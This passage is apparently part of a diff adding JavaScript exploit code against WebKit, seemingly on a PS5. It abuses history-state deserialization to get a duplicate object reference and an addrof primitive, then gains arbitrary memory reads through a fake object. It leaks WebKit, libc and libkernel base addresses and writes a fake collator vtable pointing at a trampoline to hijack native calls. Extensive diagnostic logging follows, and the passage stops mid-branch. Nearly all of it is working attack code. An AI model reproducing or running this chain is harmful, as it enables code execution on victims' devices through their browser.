+      arenaView[0xf00] = 0x52; arenaView[0xf01] = 0x4f;
+      arenaView[0xf02] = 0x50; arenaView[0xf03] = 0x31;
+      realCollator = new Intl.Collator("en", { usage: "search" });
+      compareFn = realCollator.compare;
+      if (!(compareFn("a", "b") < 0)) throw new Error("collator-prewarm-failed");
+      buildNotificationRequest();
+      notificationPrewarmResult = compareFn(notificationRequest, "b");
+      if (!Number.isFinite(notificationPrewarmResult))
+        throw new Error("notification-request-prewarm-failed");
+      holderGuardA = { marker: 0x484f4c44 };
+      holderGuardB = { marker: 0x47554152 };
+      targetHolder = {
+        q0: nativeTarget, q1: arenaView, q2: realCollator,
+        q3: compareFn, q4: holderGuardA, q5: holderGuardB
+      };
+      if (arenaView.length !== ARENA_BYTES || arenaView[0xf00] !== 0x52
+          || targetHolder.q0 !== nativeTarget || targetHolder.q1 !== arenaView
+          || targetHolder.q2 !== realCollator || targetHolder.q3 !== compareFn
+          || targetHolder.q4 !== holderGuardA || targetHolder.q5 !== holderGuardB
+          || typeof compareFn !== "function")
+        throw new Error("notify-holder-shape-failed");
+    }
+    function buildAndStoreGraph() {
+      referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
+      buildFakeHost();
+      mark("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
+      fillerGraph = new Array(0xfffd);
+      let pos = 0;
+      const huge = 1n << 40n;
+      for (let b = 0; b < FILLER_BIGINTS; ++b) fillerGraph[pos++] = huge + BigInt(b);
+      for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
+      outerGraph = new Array(CONTROL_INDEX + 1);
+      outerGraph[0] = fillerGraph;
+      outerGraph[1] = referenceTarget;
+      outerGraph[2] = referenceTarget;
+      outerGraph[CONTROL_INDEX] = CONTROL_INT;
+      mark("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);
+      mark("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
+      history.replaceState(outerGraph, "");
+      mark("SSV-STORED", "fake-host-and-rop-holder-not-serialized");
+    }
+    function prepareAddrof() {
+      capturedWords = new Uint16Array(16);
+      getterCarrier = function getterCarrierFunction() { return 7; };
+      mark("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
+      getterCarrier[0] = fakeHost;
+      for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
+      getterCarrier[1] = targetHolder;
+      getterCarrier[2] = fakeHost;
+      getterCarrier[3] = targetHolder;
+      mark("ADDROF-CARRIER-DONE", "host-holder-host-holder");
+      preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+      mark("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
+      setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+      setTimeout(beginComposition, COMPOSE_DELAY_MS);
+    }
+    function runAddrofCapture() {
+      try {
+        capturedString = symbolToString.call(preparedSymbolObject);
+        copiedLength = capturedString.length;
+        for (let i = 0; i < 16; i++)
+          capturedWords[i] = capturedString.charCodeAt(7 + i);
+        captureState = 1;
+        preparedSymbolObject = null;
+        leakedScope = null;
+        getterCarrier = null;
+        capturedString = null;
+        mark("ADDROF-ROOTS-RELEASED", "carrier-wrapper-string");
+      } catch (error) { captureError = error; captureState = -1; }
+    }
+    function fillRawCellPointers(backing, pointer) {
+      pointerHigh = Math.floor(pointer / 0x100000000);
+      pointerLow = pointer - pointerHigh * 0x100000000;
+      if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 0xffff
+          || Math.floor(pointerLow) !== pointerLow
+          || pointerLow < 0 || pointerLow > 0xffffffff
+          || pointerLow + pointerHigh * 0x100000000 !== pointer)
+        throw new Error("invalid-low48-fake-address");
+      predecessorWords = new Uint32Array(backing);
+      for (let i = 0; i < predecessorWords.length; i += 2) {
+        predecessorWords[i] = pointerLow;
+        predecessorWords[i + 1] = pointerHigh;
+      }
+      const last = predecessorWords.length - 2;
+      if (predecessorWords[0] !== pointerLow || predecessorWords[1] !== pointerHigh
+          || predecessorWords[last] !== pointerLow
+          || predecessorWords[last + 1] !== pointerHigh)
+        throw new Error("pointer-fill-verification-failed");
+    }
+    function clearPredecessor() {
+      if (predecessorWords !== null) predecessorWords.fill(0);
+    }
+
+    function loadHistoryCritical() {
+      let result = null;
+      let candidate = null;
+      let rwHeaderCaptured = false;
+      let rwVectorTouched = false;
+      try {
+        compositionStage = "history-state-deserialize";
+        result = history.state;
+        compositionStage = "history-state-length";
+        compositionLength = result.length;
+        if (compositionLength !== EXPECTED_LENGTH) {
+          result[DUPLICATE_INDEX] = undefined; result = null;
+          clearPredecessor(); retrySafe = true; compositionState = 3; return;
+        }
+        compositionStage = "history-duplicate-check";
+        if (result[1] === result[DUPLICATE_INDEX]) {
+          result[DUPLICATE_INDEX] = undefined; candidate = null;
+          result = null; clearPredecessor(); retrySafe = true;
+          compositionState = 2; return;
+        }
+        compositionStage = "history-candidate-extract";
+        candidate = result[DUPLICATE_INDEX];
+        candidateEverReturned = true;
+        result[DUPLICATE_INDEX] = undefined;
+        result = null;
+        compositionStage = "candidate-rw-header-read";
+        readBytes(rwHeader, candidate, CELL_BYTES);
+        rwHeaderCaptured = true;
+        const rwSID = uint32At(rwHeader, 0);
+        const rwHeaderHigh = uint32At(rwHeader, 4);
+        const rwButterfly = low48At(rwHeader, 8);
+        rwOriginalVector = low48At(rwHeader, 0x10);
+        const rwOffsetZero = allZero(rwHeader, 0x20, 0x28);
+        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
+          && (rwSID & 0xf) === 0 && rwHeader[4] === 0 && rwHeader[5] === 0x28
+          && rwHeader[6] === 0x08
+          && (rwHeader[7] === 0 || rwHeader[7] === 1)
+          && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
+          && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
+          && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
+          && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
+          && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
+          && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
+          && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
+          && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
+          && rwOffsetZero && rwHeader[0x28] === 0x58;
+        if (!rwHeaderOK) {
+          zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
+          retrySafe = zeroHeaderMiss && !rwVectorTouched && !candidateMutationStarted;
+          candidate = null; clearPredecessor(); compositionState = 3; return;
+        }
+        scratchWords[0] = rwSID;
+        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
+        const upgradedHeader = scratchDouble[0];
+        const upgradedFinite = upgradedHeader === upgradedHeader
+          && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
+        if (!upgradedFinite) { candidate = null; clearPredecessor(); compositionState = 3; return; }
+        candidateMutationStarted = true;
+        fakeHost.q0 = upgradedHeader;
+        if (fakeHost.q0 !== upgradedHeader) { candidate = null; clearPredecessor(); compositionState = 3; return; }
+        rwVectorTouched = true;
+        aimCarrier(candidate, targetAddress);
+        const holderRepeated = readTwiceMatches(holderHeader, rwView, HOLDER_BYTES);
+        const holderSID = uint32At(holderHeader, 0);
+        const holderButterflyZero = allZero(holderHeader, 0x08, 0x10);
+        nativeTargetAddress = low48At(holderHeader, 0x10);
+        arenaViewAddress = low48At(holderHeader, 0x18);
+        realCollatorAddress = low48At(holderHeader, 0x20);
+        compareFnAddress = low48At(holderHeader, 0x28);
+        const holderGuardAAddress = low48At(holderHeader, 0x30);
+        const holderGuardBAddress = low48At(holderHeader, 0x38);
+        holderHeaderOK = holderRepeated
+          && holderSID >= 0x4000 && holderSID < 0x08000000
+          && (holderSID & 0xf) === 0 && targetAddress % 0x10 === 0
+          && holderHeader[4] === 0 && holderHeader[5] === 0x18
+          && holderHeader[6] === 0
+          && (holderHeader[7] === 0 || holderHeader[7] === 1)
+          && holderButterflyZero
+          && plausibleCell(nativeTargetAddress)
+          && plausibleCell(arenaViewAddress)
+          && plausibleCell(realCollatorAddress)
+          && plausibleCell(compareFnAddress)
+          && plausibleCell(holderGuardAAddress)
+          && plausibleCell(holderGuardBAddress)
+          && canonicalLow48(holderHeader, 0x10)
+          && canonicalLow48(holderHeader, 0x18)
+          && canonicalLow48(holderHeader, 0x20)
+          && canonicalLow48(holderHeader, 0x28)
+          && canonicalLow48(holderHeader, 0x30)
+          && canonicalLow48(holderHeader, 0x38)
+          && nativeTargetAddress !== arenaViewAddress
+          && nativeTargetAddress !== realCollatorAddress
+          && arenaViewAddress !== realCollatorAddress
+          && realCollatorAddress !== compareFnAddress
+          && holderGuardAAddress !== holderGuardBAddress;
+        if (!holderHeaderOK) {
+          restoreCarrier(candidate); rwVectorTouched = false;
+          candidate = null; clearPredecessor(); compositionState = 3; return;
+        }
+        aimCarrier(candidate, nativeTargetAddress);
+        readBytes(targetHeader, rwView, FUNCTION_BYTES);
+        functionStructureID = uint32At(targetHeader, 0);
+        const functionButterfly = low48At(targetHeader, 0x08);
+        const functionScope = low48At(targetHeader, 0x10);
+        executableAddress = low48At(targetHeader, 0x18);
+        functionHeaderOK = functionStructureID >= 0x4000
+          && functionStructureID < 0x08000000
+          && (functionStructureID & 0xf) === 0
+          && nativeTargetAddress % 0x10 === 0
+          && targetHeader[4] === 0 && targetHeader[5] === 0x1a
+          && targetHeader[6] === 0x0e
+          && (targetHeader[7] === 0 || targetHeader[7] === 1)
+          && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
+          && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
+          && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0
+          && functionButterfly > 0x100000000 && functionButterfly <= 0xffffffffffff
+          && functionButterfly % 8 === 0
+          && functionScope > 0x100000000 && functionScope <= 0xffffffffffff
+          && functionScope % 8 === 0
+          && executableAddress > 0x100000000 && executableAddress <= 0xffffffffffff
+          && executableAddress % 0x10 === 0 && (executableAddress & 1) === 0;
+        if (!functionHeaderOK) {
+          restoreCarrier(candidate); rwVectorTouched = false;
+          candidate = null; clearPredecessor(); compositionState = 3; return;
+        }
+        aimCarrier(candidate, executableAddress);
+        readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);
+        nativeExecutableStructureID = uint32At(targetHeader, 0);
+        nativeFunctionAddress = low48At(targetHeader, 0x28);
+        nativeConstructorAddress = low48At(targetHeader, 0x30);
+        webkitBase = NaN;
+        for (let ci = 0; ci < P_HOST_CTOR_LIST.length; ++ci) {
+          const wb = nativeConstructorAddress - P_HOST_CTOR_LIST[ci];
+          if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
+            webkitBase = wb; HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[ci]; break;
+          }
+        }
+        const constructorBase = webkitBase;
+        const codeDelta = nativeFunctionAddress > nativeConstructorAddress
+          ? nativeFunctionAddress - nativeConstructorAddress
+          : nativeConstructorAddress - nativeFunctionAddress;
+        webkitBaseOK = webkitBase >= 0x800000000 && webkitBase < 0x900000000
+          && webkitBase % 0x4000 === 0 && constructorBase === webkitBase
+          && nativeFunctionAddress >= webkitBase
+          && nativeFunctionAddress < webkitBase + WEBKIT_TEXT_SIZE
+          && nativeConstructorAddress >= webkitBase
+          && nativeConstructorAddress < webkitBase + WEBKIT_TEXT_SIZE;
+        nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x4000
+          && nativeExecutableStructureID < 0x08000000
+          && (nativeExecutableStructureID & 0xf) === 0
+          && targetHeader[4] === 0 && targetHeader[5] === 0x08
+          && targetHeader[6] === 0
+          && (targetHeader[7] === 0 || targetHeader[7] === 1)
+          && targetHeader[0x2e] === 0 && targetHeader[0x2f] === 0
+          && targetHeader[0x36] === 0 && targetHeader[0x37] === 0
+          && nativeFunctionAddress >= 0x800000000
+          && nativeFunctionAddress < 0x900000000
+          && nativeConstructorAddress >= 0x800000000
+          && nativeConstructorAddress < 0x900000000
+          && nativeFunctionAddress !== nativeConstructorAddress
+          && codeDelta > 0 && codeDelta < WEBKIT_TEXT_SIZE && webkitBaseOK;
+        if (!nativeExecutableHeaderOK) {
+          restoreCarrier(candidate); rwVectorTouched = false;
+          candidate = null; clearPredecessor(); compositionState = 3; return;
+        }
+        aimCarrier(candidate, nativeTargetAddress);
+        const executableAddress2 = low48At(rwView, 0x18);
+        const functionType2 = rwView[5];
+        aimCarrier(candidate, executableAddress);
+        const nativeFunctionAddress2 = low48At(rwView, 0x28);
+        const nativeConstructorAddress2 = low48At(rwView, 0x30);
+        const nativeExecutableType2 = rwView[5];
+        pointersRepeated = executableAddress2 === executableAddress
+          && nativeFunctionAddress2 === nativeFunctionAddress
+          && nativeConstructorAddress2 === nativeConstructorAddress
+          && functionType2 === 0x1a && nativeExecutableType2 === 0x08;
+        const getpidSlotAddress = webkitBase + P_GETPID_SLOT;
+        const closeSlotAddress = webkitBase + P_CLOSE_SLOT;
+        const errorSlotAddress = webkitBase + P_ERROR_SLOT;
+        aimCarrier(candidate, getpidSlotAddress);
+        getpidPointer = low48At(rwView, 0);
+        const getpidPointer2 = low48At(rwView, 0);
+        const getpidCanonical = rwView[6] === 0 && rwView[7] === 0;
+        aimCarrier(candidate, closeSlotAddress);
+        closePointer = low48At(rwView, 0);
+        const closePointer2 = low48At(rwView, 0);
+        const closeCanonical = rwView[6] === 0 && rwView[7] === 0;
+        aimCarrier(candidate, errorSlotAddress);
+        errorPointer = low48At(rwView, 0);
+        const errorPointer2 = low48At(rwView, 0);
+        const errorCanonical = rwView[6] === 0 && rwView[7] === 0;
+        gotReadAttempted = true;
+        gotWindowAddressesOK = getpidSlotAddress % 8 === 0
+          && closeSlotAddress % 8 === 0 && errorSlotAddress % 8 === 0;
+        gotWindowsRepeated = getpidPointer === getpidPointer2
+          && closePointer === closePointer2 && errorPointer === errorPointer2;
+        gotCanonicalOK = getpidCanonical && closeCanonical && errorCanonical
+          && plausibleCell(getpidPointer) && plausibleCell(closePointer)
+          && plausibleCell(errorPointer);
+        gotReadOK = pointersRepeated && gotReadAttempted
+          && gotWindowAddressesOK && gotWindowsRepeated && gotCanonicalOK;
+        requirementsBaseOK = false;
+        libcBaseOK = false;
+        const getpidBase = getpidPointer - P_GETPID_EXP;
+        const closeBase = closePointer - P_CLOSE_EXP;
+        const errorBase = errorPointer - P_ERROR_EXP;
+        getpidStatus = 1; closeStatus = 1; errorStatus = 1;
+        kernelBase = getpidBase; kernelResolvedCount = 3;
+        const kernelConsistent = getpidBase === closeBase && getpidBase === errorBase;
+        kernelBaseOK = gotReadOK && kernelConsistent
+          && inPS5UserModuleBand(kernelBase)
+          && kernelBase % 0x4000 === 0 && kernelBase !== webkitBase;
+        notifyEntryAddress = kernelBase + NOTIFY_OFFSET;
+        notifyAddressOK = NOTIFY_TARGET_VERIFIED && kernelBaseOK
+          && getpidStatus === 1
+          && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
+          && notifyEntryAddress >= kernelBase
+          && notifyEntryAddress < kernelBase + KERNEL_TEXT_SIZE;
+        aimCarrier(candidate, arenaViewAddress);
+        const arenaHeaderRepeated = readTwiceMatches(arenaViewHeader, rwView, ARENA_VIEW_BYTES);
+        const arenaSID = uint32At(arenaViewHeader, 0);
+        const arenaButterfly = low48At(arenaViewHeader, 0x08);
+        arenaBacking = low48At(arenaViewHeader, 0x10);
+        const arenaLength = low48At(arenaViewHeader, 0x18);
+        arenaViewHeaderOK = arenaHeaderRepeated && arenaSID === rwSID
+          && arenaViewAddress % 8 === 0
+          && arenaViewHeader[4] === 0 && arenaViewHeader[5] === 0x28
+          && arenaViewHeader[6] === 0x08
+          && (arenaViewHeader[7] === 0 || arenaViewHeader[7] === 1)
+          && plausibleCell(arenaButterfly) && plausibleCell(arenaBacking)
+          && arenaBacking % 0x10 === 0
+          && canonicalLow48(arenaViewHeader, 0x08)
+          && canonicalLow48(arenaViewHeader, 0x10)
+          && canonicalLow48(arenaViewHeader, 0x18)
+          && arenaLength === ARENA_BYTES
+          && allZero(arenaViewHeader, 0x20, 0x28)
+          && arenaViewHeader[0x28] === 0x58;
+        if (arenaViewHeaderOK) {
+          aimCarrier(candidate, arenaBacking + 0xf00);
+          arenaBackingRepeated = rwView[0] === 0x52 && rwView[1] === 0x4f
+            && rwView[2] === 0x50 && rwView[3] === 0x31
+            && rwView[0] === arenaView[0xf00] && rwView[1] === arenaView[0xf01]
+            && rwView[2] === arenaView[0xf02] && rwView[3] === arenaView[0xf03];
+        }
+        aimCarrier(candidate, realCollatorAddress);
+        const collatorRepeated = readTwiceMatches(collatorHeader, rwView, COLLATOR_BYTES);
+        const collatorSID = uint32At(collatorHeader, 0);
+        const collatorBoundCompare = low48At(collatorHeader, 0x10);
+        const originalUCollator = low48At(collatorHeader, 0x18);
+        const localeImpl = low48At(collatorHeader, 0x20);
+        const collationImpl = low48At(collatorHeader, 0x28);
+        collatorHeaderOK = collatorRepeated
+          && collatorSID >= 0x4000 && collatorSID < 0x08000000
+          && (collatorSID & 0xf) === 0 && realCollatorAddress % 8 === 0
+          && collatorHeader[4] === 0 && collatorHeader[5] === 0x17
+          && (collatorHeader[7] === 0 || collatorHeader[7] === 1)
+          && allZero(collatorHeader, 0x08, 0x10)
+          && collatorBoundCompare === compareFnAddress
+          && plausibleAddress(originalUCollator) && plausibleAddress(localeImpl)
+          && plausibleAddress(collationImpl)
+          && canonicalLow48(collatorHeader, 0x10)
+          && canonicalLow48(collatorHeader, 0x18)
+          && canonicalLow48(collatorHeader, 0x20)
+          && canonicalLow48(collatorHeader, 0x28)
+          && collatorHeader[0x30] === 1 && collatorHeader[0x33] === 0;
+        for (let sc = 0; sc < collatorOriginal.length; ++sc)
+          collatorOriginal[sc] = collatorHeader[0x18 + sc];
+        aimCarrier(candidate, compareFnAddress);
+        const compareHeaderRepeated = readTwiceMatches(compareFnHeader, rwView, BOUND_COMPARE_BYTES);
+        const compareSID = uint32At(compareFnHeader, 0);
+        compareFnHeaderOK = compareHeaderRepeated
+          && compareSID >= 0x4000 && compareSID < 0x08000000
+          && (compareSID & 0xf) === 0 && compareFnAddress % 8 === 0
+          && compareFnHeader[4] === 0 && compareFnHeader[5] === 0x1a
+          && compareFnHeader[6] === 0x0c
+          && (compareFnHeader[7] === 0 || compareFnHeader[7] === 1)
+          && typeof compareFn === "function";
+        naturalTrampolineAddress = kernelBase + NATURAL_TRAMPOLINE_OFFSET;
+        fakeUCollatorAddress = arenaBacking + FAKE_UCOLLATOR_OFFSET;
+        fakeVtableAddress = arenaBacking + FAKE_VTABLE_OFFSET;
+        arenaLayoutOK = arenaViewHeaderOK && arenaBackingRepeated && kernelBaseOK
+          && arenaBacking % 0x10 === 0
+          && fakeUCollatorAddress >= arenaBacking
+          && fakeUCollatorAddress + 0xe8 <= arenaBacking + ARENA_BYTES
+          && fakeVtableAddress >= arenaBacking
+          && fakeVtableAddress + 0x130 <= arenaBacking + ARENA_BYTES
+          && getpidStatus === 1 && notifyAddressOK
+          && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
+          && notifyEntryAddress >= kernelBase
+          && notifyEntryAddress < kernelBase + KERNEL_TEXT_SIZE
+          && naturalTrampolineAddress >= kernelBase
+          && naturalTrampolineAddress < kernelBase + KERNEL_TEXT_SIZE;
+        if (arenaLayoutOK && holderHeaderOK && functionHeaderOK
+            && nativeExecutableHeaderOK && webkitBaseOK && pointersRepeated
+            && gotReadOK && requirementsBaseOK && libcBaseOK && kernelBaseOK
+            && collatorHeaderOK && compareFnHeaderOK) {
+          putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddress);
+          for (let z = 0; z < 8; ++z) arenaView[FAKE_UCOLLATOR_OFFSET + 0x48 + z] = 0;
+          for (let z = 0; z < 8; ++z) arenaView[FAKE_UCOLLATOR_OFFSET + 0x60 + z] = 0;
+          putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntryAddress);
+          putLow48(arenaView, FAKE_VTABLE_OFFSET + 0x128, naturalTrampolineAddress);
+          arenaFilledOK = low48StoredExactly(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddress)
+            && allZero(arenaView, FAKE_UCOLLATOR_OFFSET + 0x48, FAKE_UCOLLATOR_OFFSET + 0x50)
+            && allZero(arenaView, FAKE_UCOLLATOR_OFFSET + 0x60, FAKE_UCOLLATOR_OFFSET + 0x68)
+            && low48StoredExactly(arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntryAddress)
+            && low48StoredExactly(arenaView, FAKE_VTABLE_OFFSET + 0x128, naturalTrampolineAddress);
+        }
+        notifyReady = arenaFilledOK && collatorHeaderOK && compareFnHeaderOK
+          && getpidStatus === 1 && notificationRequestOK && notifyAddressOK;
+        if (notifyReady) {
+          aimCarrier(candidate, realCollatorAddress + 0x18);
+          carrierArmedForCommit = sameBytes(rwView, collatorOriginal, collatorOriginal.length);
+          notifyReady = notifyReady && carrierArmedForCommit;
+          if (notifyReady) carrierCandidate = candidate;
+        }
+        if (!notifyReady) {
+          restoreCarrier(candidate); rwVectorTouched = false;
+          targetView[0] = 0xa5; rwMirror[0] = 0x3c;
+          restoreObserved = rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
+        } else {
+          rwVectorTouched = false;
+          restoreObserved = rwMirror[0] === 0x3c && targetView[0] === 0xa5;
+        }
+        candidate = null; clearPredecessor(); compositionState = 1;
+      } catch (error) {
+        retrySafe = candidate === null && result === null
+          && !rwHeaderCaptured && error?.name === "TypeError";
+        if (result !== null) { try { result[DUPLICATE_INDEX] = undefined; } catch {} }
+        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
+          try { restoreCarrier(candidate); } catch {}
+        }
+        candidate = null; result = null;
+        try { targetView[0] = 0xa5; } catch {}
+        try { rwMirror[0] = 0x3c; } catch {}
+        try { clearPredecessor(); } catch {}
+        compositionError = error; compositionState = -1;
+      }
+    }
+
+    function reportComposition() {
+      if (compositionState < 0) {
+        mark("SSV-PLACEMENT-STAGE", compositionStage);
+        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
+          `${compositionError?.name}:${String(compositionError?.message).slice(0, 80)}`);
+        mark("DONE-THROW", `predecessor-cleared=true-retry-safe=${retrySafe}`
+          + `-candidate-seen=${candidateEverReturned}`
+          + `-candidate-mutated=${candidateMutationStarted}`);
+        if (!retrySafe) { try { sessionStorage.setItem(blockKey, "1"); } catch {} failed(); }
+        if (retrySafe) scheduleSafeRetry("placement-throw");
+        return;
+      }
+      if (compositionState === 2) {
+        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
+        mark("DONE-MISS", "predecessor-cleared=true-retry-safe=true-candidate-seen=false-candidate-mutated=false");
+        scheduleSafeRetry("normal-clone-miss");
+        return;
+      }
+      if (compositionState === 3) {
+        const mismatchTag = zeroHeaderMiss ? "ZERO-HEADER-MISS"
+          : (retrySafe ? "COMPOSITION-LENGTH-MISS" : "VALIDATION-MISMATCH");
+        mark(mismatchTag, `rw=${rwHeaderOK}-holder=${holderHeaderOK}`
+          + `-function=${functionHeaderOK}-native-executable=${nativeExecutableHeaderOK}`
+          + `-base=${webkitBaseOK}-repeat=${pointersRepeated}`
+          + `-retry-safe=${retrySafe}-candidate-seen=${candidateEverReturned}`
+          + `-candidate-mutated=${candidateMutationStarted}-zero-header-miss=${zeroHeaderMiss}`
+          + "-carrier-restored=true");
+        mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
+        mark("WALK-BYTES-HEX", dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
+        if (!retrySafe) { try { sessionStorage.setItem(blockKey, "1"); } catch {} failed(); }
+        if (retrySafe) scheduleSafeRetry(zeroHeaderMiss ? "zero-header-miss" : "composition-length-mismatch");
+        return;
+      }
+      if (compositionState === 0) {
+        mark("NO-RESULT", "critical-load-did-not-finish"); failed(); return;
+      }
+      mark("SSV-RETURNED-CLEARED", `length=${compositionLength}-predecessor-cleared=true`);
+      mark("RW-CARRIER", `sid=${hex(uint32At(rwHeader, 0))}-vector=${hex(rwOriginalVector)}`
+        + `-length=0x100-mode=0x${rwHeader[0x28].toString(16)}`);
+      mark("HOLDER", `cell=${hex(targetAddress)}-header-pass=${holderHeaderOK}`);
+      mark("JSFUNCTION", `parseInt=${hex(nativeTargetAddress)}-sid=${hex(functionStructureID)}`
+        + `-executable=${hex(executableAddress)}`);
+      mark("NATIVE-EXECUTABLE", `P=${hex(executableAddress)}-sid=${hex(nativeExecutableStructureID)}`);
+      mark("NATIVE-CALL-TARGET", `parseInt=${hex(nativeFunctionAddress)}`
+        + `-constructor=${hex(nativeConstructorAddress)}`);
+      mark("WEBKIT-BASE", `${hex(webkitBase)}-parseInt-rva=${hex(PARSEINT_NATIVE_OFFSET)}`
+        + `-constructor-rva=${hex(HOST_CONSTRUCTOR_OFFSET)}-text-size=${hex(WEBKIT_TEXT_SIZE)}`);
+      mark("IMPORT-WINDOWS", `A=${hex(webkitBase + IMPORT_WINDOW_A_OFFSET)}`
+        + `+${hex(IMPORT_WINDOW_A_BYTES)}-B=${hex(webkitBase + IMPORT_WINDOW_B_OFFSET)}`
+        + `+${hex(IMPORT_WINDOW_B_BYTES)}-address-ok=${gotWindowAddressesOK}`
+        + `-read-twice=${gotWindowsRepeated}-canonical=${gotCanonicalOK}`);
+      mark("REQUIREMENTS-IMPORTS", `A=${hex(requirementsObjectA)}-B=${hex(requirementsObjectB)}`);
+      mark("REQUIREMENTS-BASE", `${hex(requirementsBase)}`
+        + `-paired=${requirementsObjectA !== 0 && requirementsObjectB !== 0}`
+        + `-pass=${requirementsBaseOK}`);
+      mark("LIBC-IMPORTS-1", `cxa_finalize=${hex(cxaFinalizePointer)}:${cxaFinalizeStatus}`
+        + `-strlen=${hex(strlenPointer)}:${strlenStatus}`);
+      mark("LIBC-IMPORTS-2", `strerror=${hex(strerrorPointer)}:${strerrorStatus}`
+        + `-memchr=${hex(memchrPointer)}:${memchrStatus}`);
+      mark("LIBC-BASE", `${hex(libcBase)}-equations=${libcResolvedCount}-pass=${libcBaseOK}`);
+      mark("LIBKERNEL-WEB-IMPORTS-1", `object=${hex(kernelObjectPointer)}`
+        + `-close=${hex(closePointer)}:${closeStatus}-error=${hex(errorPointer)}:${errorStatus}`);
+      mark("LIBKERNEL-WEB-IMPORTS-2", `getpid=${hex(getpidPointer)}:${getpidStatus}`
+        + `-pthread_getspecific=${hex(pthreadGetspecificPointer)}:${pthreadGetspecificStatus}`);
+      mark("LIBKERNEL-WEB-BASE-CANDIDATE", `${hex(kernelBase)}`
+        + `-equations=${kernelResolvedCount}-object-anchor=${kernelObjectBaseOK}`
+        + `-candidate-pass=${kernelBaseOK}`);
+      mark("KERNEL-RW-STATUS", "unavailable-primitive=none");
+      mark("ARENA-CELL", `view=${hex(arenaViewAddress)}-backing=${hex(arenaBacking)}`
+        + `-size=${hex(ARENA_BYTES)}-header-pass=${arenaViewHeaderOK}`
+        + `-sentinel-pass=${arenaBackingRepeated}`);
+      mark("COLLATOR", `cell=${hex(realCollatorAddress)}`
+        + `-m_collator=${hex(realCollatorAddress + 0x18)}`
+        + `-original=${hex(low48At(collatorHeader, 0x18))}`
+        + `-compare=${hex(compareFnAddress)}-search-prewarmed=${collatorHeaderOK}`);
+      mark("NOTIFY-ARENA", `B=${hex(fakeUCollatorAddress)}-V=${hex(fakeVtableAddress)}`
+        + `-virtual-slot=${hex(fakeVtableAddress + 0x128)}`);
+      mark("NOTIFY-TRAMPOLINE", `${hex(naturalTrampolineAddress)}`
+        + `-libkernel-rva=${hex(NATURAL_TRAMPOLINE_OFFSET)}-natural-rsp=true`);
+      mark("NOTIFY-TARGET", `${hex(notifyEntryAddress)}-libkernel-rva=${hex(NOTIFY_OFFSET)}`
+        + `-address-ok=${notifyAddressOK}`);
+      mark("NOTIFY-CONTEXT", "B+48-rdi=0-device-B+60-rcx=0-nonblocking"
+        + `-B+e0=notification-export-rsi=request-rdx=${hex(NOTIFICATION_REQUEST_SIZE)}`);
+      mark("NOTIFY-REQUEST", `size=${hex(NOTIFICATION_REQUEST_SIZE)}`
+        + `-message-offset=${hex(NOTIFICATION_MESSAGE_OFFSET)}`
+        + `-ascii=true-layout-pass=${notificationRequestOK}`
+        + `-prewarm-result=${notificationPrewarmResult}`);
+      mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
+      mark("NATIVE-EXECUTABLE-HEX", dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
+      mark("IMPORT-WINDOW-A-HEX", dumpHex(importWindowA1, IMPORT_WINDOW_A_BYTES));
+      mark("IMPORT-WINDOW-B-HEX", dumpHex(importWindowB1, IMPORT_WINDOW_B_BYTES));
+      const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK
+        && nativeExecutableHeaderOK && webkitBaseOK && pointersRepeated
+        && restoreObserved && gotReadOK && kernelBaseOK && arenaViewHeaderOK
+        && arenaBackingRepeated && collatorHeaderOK && compareFnHeaderOK
+        && getpidStatus === 1 && notifyAddressOK && notificationRequestOK
+        && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
+        && compositionLength === EXPECTED_LENGTH;
+      try {
+        sessionStorage.setItem(blockKey, "1");
+        sessionStorage.setItem(passKey, "pending");
+        commitBlockConfirmed = sessionStorage.getItem(blockKey) === "1"
+          && sessionStorage.getItem(passKey) === "pending";
+      } catch { commitBlockConfirmed = false; }
+      if (leakPass) {
